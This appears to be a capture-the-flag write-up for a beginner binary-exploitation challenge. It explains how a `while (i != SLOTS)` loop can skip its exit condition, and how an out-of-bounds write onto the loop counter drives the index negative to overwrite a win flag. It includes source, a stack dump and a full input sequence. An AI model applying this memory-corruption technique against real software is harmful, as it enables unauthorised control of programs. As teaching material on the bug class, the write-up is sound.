# big-win

- Category: pwn
- Difficulty: easy

"i heard that 99% of gamblers walk away before winning big. i am the 99%."

Source is given and there is no overflow in it — no `gets`, no `memcpy`, every `scanf` writes into a struct field. The bug is an off-by-one in the loop counter that turns a bounded `for`-style loop into an unbounded one, and the win condition is reached by making an array index go *negative*.

### Solution:

##### 1. The loop can skip its own exit condition

```c
#define SLOTS 7
struct gambler { int win; int numbers[SLOTS]; };

void challenge(void) {
    struct gambler noob;
    noob.win = 0x67;
    int i = 0, accum = 0;
    while (i != SLOTS) {
        printf("number> ");
        scanf("%d", &noob.numbers[i]);
        accum += noob.numbers[i];
        if (accum == 67) {
            puts("thats a naughty naughty number, one less chance to win");
            i++;
        }
        i++;
    }
    puts("spinning the lotto of fate, lets see if you win...");
    if (noob.win == 0x67) { puts("rip the odds were not in your favour"); return; }
    puts("wtf you win???");
    win();
}
```

The exit test is `i != SLOTS`, not `i < SLOTS`. Hitting `accum == 67` bumps `i` twice in one iteration, so entering that branch at `i == 6` steps straight from 6 to 8 and the loop never compares equal to 7 again. From then on `scanf` writes to `noob.numbers[8]`, `[9]`, `[10]`, … — out of bounds, walking up the stack frame.

`win` is at offset 0 of the struct and `numbers` at offset 4, so `noob.win` is `numbers[-1]`. The index only ever increments, so the only way to reach it is to get a negative value *into `i` itself*.

##### 2. The remote's stack printer gives the layout

The challenge ships a `SNAPSHOT()` on the remote that dumps the frame. Sending one number and reading it back:

```
=== stack printer ===
rbp-48: 0x0000000000000067  <-- rsp
rbp-40: 0x00007ffce3a5c868
rbp-32: 0x0000000000000001
rbp-24: 0x0000000000000000
rbp-16: 0x0000000000403df0
rbp-08: 0x0000000000000000
rbp+00: 0x00007ffce3a5c740  <-- rbp
```

`0x67` sits at `rbp-0x30`, so the struct is at `rbp-0x30` and `numbers[k]` is at `rbp-0x2c + 4k`. Nothing between `numbers` and `rbp` is a canary — the low dword of `rbp-0x08` is `accum` and the high dword (`rbp-0x04`) is `i`. That is the no-stack-protector layout, which matches the other binaries in this set (all `No Canary Found`), and it is the whole game: with `-fstack-protector` gcc hoists the array *above* the scalars and `i` would be at a negative index, unreachable.

Converting to indices:

```
numbers[-1] -> rbp-0x30   noob.win
numbers[0..6]             the array
numbers[9]  -> rbp-0x08   accum
numbers[10] -> rbp-0x04   i
```

##### 3. Writing `i` to steer the index negative

`i` is writable as `numbers[10]`. Writing `v` there makes the loop do `accum += numbers[10]` (reading back `v`), then `i++` — so the next index is `v + 1`. Choosing `v = -2` puts the following write at `numbers[-1]`, which is `noob.win`.

The full sequence, keeping `accum` away from 67 at every step that must not skip:

```python
seq = [
    0,0,0,0,0,0,   # idx 0..5, accum = 0
    67,            # idx 6 -> accum == 67 -> bonus i++ -> i jumps 6 -> 8 (OOB)
    1,             # idx 8  (padding) accum = 68
    0,             # idx 9  == accum  -> accum = 0 + 0 = 0
    -2,            # idx 10 == i      -> i = -2, accum = -2, then i++ -> -1
    1337,          # idx -1 == win    -> win = 1337 != 0x67 ; i++ -> 0
    0,0,0,0,0,0,0, # idx 0..6 again, accum stays 1335, loop exits at i == 7
]
```

Step 9 is the one that needs care: `scanf` writes `0` into `accum`, and *then* the loop does `accum += numbers[9]`, reading the value it just stored — so `accum` ends at `2*0`, not `0 + old`. Any value works as long as `2v != 67`, which is free since 67 is odd.

After the write to `numbers[-1]`, `i` becomes 0 and the loop replays slots 0..6 normally, this time exiting cleanly at `i == 7` with `noob.win == 1337`:

```
$ ./solve.py remote
spinning the lotto of fate, lets see if you win...
wtf you win???
K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}
```

Full script: [solve.py](solve.py)

**Flag:** `K17{maybe_the_true_reward_is_the_stacks_we_pwned_along_the_way}`

### Takeaways

- `while (i != N)` with any code path that increments `i` more than once per iteration is an unbounded loop, and unbounded loops over an array index are as good as an arbitrary write. `i < N` would have been harmless.
- When the OOB index is monotonically increasing, the interesting target is usually not the data above the array — it is the *loop counter itself*. Once the counter is in range of the write, the index becomes fully controlled in both directions.
